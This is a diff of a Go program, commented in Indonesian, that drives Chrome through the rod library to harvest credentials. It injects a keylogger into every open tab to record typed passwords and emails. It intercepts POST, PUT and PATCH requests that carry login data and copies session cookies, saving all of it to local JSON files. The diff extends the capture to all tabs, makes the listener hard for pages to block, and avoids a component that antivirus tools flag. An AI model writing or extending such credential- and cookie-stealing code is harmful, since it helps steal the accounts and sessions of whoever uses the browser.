@@ -31,10 +31,10 @@ type CookieData struct {
 
 // CredentialData untuk menyimpan data login yang disadap
 type CredentialData struct {
-	URL      string    `json:"url"`
-	Type     string    `json:"type"` // "form-data", "json", atau "input-field"
-	Data     string    `json:"data"`
-	Time     time.Time `json:"time"`
+	URL  string    `json:"url"`
+	Type string    `json:"type"` // "form-data", "json", atau "input-field"
+	Data string    `json:"data"`
+	Time time.Time `json:"time"`
 }
 
 func main() {
@@ -47,7 +47,7 @@ func main() {
 	if err != nil {
 		log.Fatalf("Gagal mendapatkan direktori user: %v", err)
 	}
-	
+
 	// Secara otomatis menaruh data profil di C:\Users\Username\browsea-data
 	userDataDir := filepath.Join(homeDir, "browsea-data")
 
@@ -57,9 +57,9 @@ func main() {
 	u, err := launcher.New().
 		Bin(path).
 		Headless(false).
-		Leakless(false). // Mencegah pembuatan binary leakless di Temp yang dianggap malware
+		Leakless(false).          // Mencegah pembuatan binary leakless di Temp yang dianggap malware
 		UserDataDir(userDataDir). // Simpan data profile browser agar session login tidak hilang
-		Set("start-maximized"). // Buka window secara ter-maximize sedari awal
+		Set("start-maximized").   // Buka window secara ter-maximize sedari awal
 		Launch()
 
 	if err != nil {
@@ -90,19 +90,15 @@ func main() {
 	fmt.Println("Tekan Ctrl+C untuk berhenti monitoring.")
 
 	// Biarkan user mengetik sendiri atau melanjutkan session yang direstore otomatis oleh Chrome.
-	// Kita ambil daftar tab yang aktif saat ini.
 	pages, _ := browser.Pages()
-	var page *rod.Page
-	if len(pages) > 0 {
-		page = pages[0]
-	} else {
+	if len(pages) == 0 {
 		// Fallback jika tidak ada tab sama sekali, buka tab kosong
-		page = browser.MustPage("")
+		browser.MustPage("")
 	}
 
-	// Monitor input fields (seperti keylogger sederhana pada field password) untuk tab awal
-	go monitorInputFields(page, homeDir)
-	
+	// Monitor input fields (keylogger) secara dinamis untuk SELURUH tab yang terbuka
+	go monitorInputFields(browser, homeDir)
+
 	// Monitor network request POST untuk menangkap form submission di level browser (seluruh tab)
 	go monitorNetworkRequests(browser, homeDir)
 
@@ -110,51 +106,76 @@ func main() {
 	monitorCookies(browser, homeDir)
 }
 
-func monitorInputFields(page *rod.Page, homeDir string) {
-	// Inject JavaScript untuk merekam input password dan username
-	js := `
-		() => {
-			window.capturedCredentials = {};
-			
-			document.addEventListener('input', (e) => {
-				const target = e.target;
-				if (target.tagName === 'INPUT') {
-					const type = target.type.toLowerCase();
-					const name = target.name || target.id || 'unknown';
-					
-					// Rekam field password, email, text (username)
-					if (type === 'password' || type === 'email' || type === 'text' || name.toLowerCase().includes('user') || name.toLowerCase().includes('login')) {
-						window.capturedCredentials[name] = target.value;
-					}
-				}
-			});
-
-			document.addEventListener('submit', (e) => {
-				// Saat form disubmit, kembalikan data yang tertangkap
-				if (Object.keys(window.capturedCredentials).length > 0) {
-					// Kita bisa kirim data ini lewat evaluasi dari Go
-					e.target.setAttribute('data-captured', JSON.stringify(window.capturedCredentials));
-				}
-			});
-		}
-	`
-	page.MustEvalOnNewDocument(js)
-	
+func monitorInputFields(browser *rod.Browser, homeDir string) {
 	ticker := time.NewTicker(2 * time.Second)
 	defer ticker.Stop()
-	
+
 	for range ticker.C {
-		// Tarik data credential dari page
-		res, err := page.Eval(`() => JSON.stringify(window.capturedCredentials || {})`)
+		pages, err := browser.Pages()
 		if err != nil {
-			continue // Page mungkin sedang reload
+			continue
 		}
-		
-		val := res.Value.Str()
-		if val != "{}" && val != "" {
-			// Kita memiliki data ketikan
-			// Jika ingin dilog langsung setiap ketik bisa di sini
-			// Namun lebih efektif ditangkap saat netwok request (POST)
+
+		for _, p := range pages {
+			// Evaluasi JavaScript langsung ke setiap halaman untuk memonitor DOM.
+			// Kode ini aman dijalankan berulang karena kita menggunakan flag __hijack_injected
+			_, _ = p.Eval(`() => {
+				if (!window.__hijack_injected) {
+					window.__hijack_injected = true;
+					window.capturedCredentials = {};
+					document.addEventListener('input', (e) => {
+						const target = e.target;
+						if (target && target.tagName === 'INPUT') {
+							const type = (target.type || '').toLowerCase();
+							const name = (target.name || target.id || 'unknown').toLowerCase();
+							
+							if (type === 'password' || type === 'email' || type === 'text' || name.includes('user') || name.includes('login') || name.includes('email')) {
+								window.capturedCredentials[name] = target.value;
+							}
+						}
+					}, true); // Gunakan 'capture' phase untuk mencegah event diblokir oleh React SPA
+				}
+			}`)
+
+			res, err := p.Eval(`() => JSON.stringify(window.capturedCredentials || {})`)
+			if err != nil {
+				continue 
+			}
+
+			val := res.Value.Str()
+			if val != "{}" && val != "" {
+				credFile := filepath.Join(homeDir, "browsea-data", "credentials.json")
+				var existingCreds []CredentialData
+				fileData, _ := os.ReadFile(credFile)
+				json.Unmarshal(fileData, &existingCreds)
+
+				urlStr := "unknown"
+				info, err := p.Info()
+				if err == nil && info != nil {
+					urlStr = info.URL
+				}
+
+				cred := CredentialData{
+					URL:  urlStr,
+					Type: "input-field",
+					Data: val,
+					Time: time.Now(),
+				}
+
+				// Cek supaya kita tidak log data yang sama persis berturut-turut untuk mengurangi spam
+				isNew := true
+				if len(existingCreds) > 0 {
+					lastCred := existingCreds[len(existingCreds)-1]
+					if lastCred.Type == "input-field" && lastCred.Data == val {
+						isNew = false
+					}
+				}
+
+				if isNew {
+					existingCreds = append(existingCreds, cred)
+					saveToJSON(existingCreds, credFile)
+				}
+			}
 		}
 	}
 }
@@ -166,34 +187,37 @@ func monitorNetworkRequests(browser *rod.Browser, homeDir string) {
 	router.MustAdd("*", func(ctx *rod.Hijack) {
 		req := ctx.Request
 		httpReq := req.Req()
-		
+
 		// Deteksi request POST, PUT, atau PATCH yang biasa dipakai login
 		method := httpReq.Method
 		if method == "POST" || method == "PUT" || method == "PATCH" {
 			urlStr := httpReq.URL.String()
-			
+
 			// Dapatkan payload POST/PUT
 			postData := req.Body()
-			
+
 			if postData != "" {
+				// [DEBUG] Print semua POST request untuk melacak payload yang mungkin luput
+				fmt.Printf("\n[DEBUG] %s Request ke: %s\nPayload: %s\n", method, urlStr, truncateString(postData, 100))
+
 				// Deteksi keyword yang berhubungan dengan login/auth
 				lowerData := strings.ToLower(postData)
-				if strings.Contains(lowerData, "password") || 
-				   strings.Contains(lowerData, "pass") || 
-				   strings.Contains(lowerData, "user") || 
-				   strings.Contains(lowerData, "email") ||
-				   strings.Contains(lowerData, "login") ||
-				   strings.Contains(lowerData, "auth") {
-					
+				if strings.Contains(lowerData, "password") ||
+					strings.Contains(lowerData, "pass") ||
+					strings.Contains(lowerData, "user") ||
+					strings.Contains(lowerData, "email") ||
+					strings.Contains(lowerData, "login") ||
+					strings.Contains(lowerData, "auth") {
+
 					fmt.Printf("\n[!] Potensi Data Login Tersadap (Request POST ke %s)!\n", truncateString(urlStr, 50))
-					
+
 					cred := CredentialData{
 						URL:  urlStr,
 						Type: "network-request",
 						Data: postData,
 						Time: time.Now(),
 					}
-					
+
 					// Tentukan tipe data
 					if strings.HasPrefix(postData, "{") {
 						cred.Type = "json"
@@ -202,16 +226,16 @@ func monitorNetworkRequests(browser *rod.Browser, homeDir string) {
 						cred.Type = "form-data"
 						fmt.Printf("   >>> [FORM] %s\n", truncateString(postData, 100))
 					}
-					
+
 					// Load existing credits and append
 					credFile := filepath.Join(homeDir, "browsea-data", "credentials.json")
-					
+
 					var existingCreds []CredentialData
 					fileData, err := os.ReadFile(credFile)
 					if err == nil {
 						json.Unmarshal(fileData, &existingCreds)
 					}
-					
+
 					// Hanya tambahkan jika datanya belum ada di daftar untuk mencegah duplikat berlebih
 					isNew := true
 					for _, c := range existingCreds {
@@ -220,7 +244,7 @@ func monitorNetworkRequests(browser *rod.Browser, homeDir string) {
 							break
 						}
 					}
-					
+
 					if isNew {
 						existingCreds = append(existingCreds, cred)
 						saveToJSON(existingCreds, credFile)
@@ -228,11 +252,11 @@ func monitorNetworkRequests(browser *rod.Browser, homeDir string) {
 				}
 			}
 		}
-		
+
 		// Lanjutkan request secara normal
 		ctx.ContinueRequest(&proto.FetchContinueRequest{})
 	})
-	
+
 	go router.Run()
 }
 
@@ -251,7 +275,7 @@ func monitorCookies(browser *rod.Browser, homeDir string) {
 
 		// Kita monitor cookie di halaman aktif yang pertama
 		page := pages[0]
-		
+
 		// Mengambil semua cookies untuk URL yang ada di halaman tersebut
 		cookies, err := page.Cookies([]string{})
 		if err != nil {
@@ -266,7 +290,7 @@ func monitorCookies(browser *rod.Browser, homeDir string) {
 			// Jika ada perubahan cookie
 			if currentCookiesStr != previousCookiesStr {
 				fmt.Println("\n[!] Cookie Baru / Perubahan Session Terdeteksi!")
-				
+
 				var cookieDataList []CookieData
 				for _, c := range cookies {
 					cookieDataList = append(cookieDataList, CookieData{
@@ -279,7 +303,7 @@ func monitorCookies(browser *rod.Browser, homeDir string) {
 						Expires:  float64(c.Expires),
 						Session:  c.Session,
 					})
-					
+
 					// Highlight cookie yang rentan atau menarik
 					warning := ""
 					if !c.HTTPOnly {
@@ -288,7 +312,7 @@ func monitorCookies(browser *rod.Browser, homeDir string) {
 					if !c.Secure {
 						warning += " [Secure=false]"
 					}
-					
+
 					// Jangan print value terlalu panjang
 					fmt.Printf("- %s = %s... %s\n", c.Name, truncateString(c.Value, 40), warning)
 
@@ -302,7 +326,7 @@ func monitorCookies(browser *rod.Browser, homeDir string) {
 				// Simpan ke file log JSON di direktori data profile
 				cookieFilePath := filepath.Join(homeDir, "browsea-data", "cookies.json")
 				saveToJSON(cookieDataList, cookieFilePath)
-				
+
 				previousCookiesStr = currentCookiesStr
 			}
 		}
@@ -330,12 +354,12 @@ func saveToJSON(data interface{}, filename string) error {
 func killZombieChrome(userDataDir string) {
 	fmt.Println("[*] Membersihkan sisa proses browser di background...")
 	folderName := filepath.Base(userDataDir)
-	
+
 	// Gunakan PowerShell untuk mencari Chrome dengan parameter folder session kita
 	psCmd := fmt.Sprintf(`Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" | Where-Object {$_.CommandLine -match '%s'} | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }`, folderName)
 	cmd := exec.Command("powershell", "-NoProfile", "-Command", psCmd)
 	_ = cmd.Run() // Kita abaikan return err jika memang tab tidak ditemukan
-	
+
 	// Jeda waktu supaya sistem operasi benar-benar melepaskan file yang ter-lock
 	time.Sleep(1 * time.Second)
 }
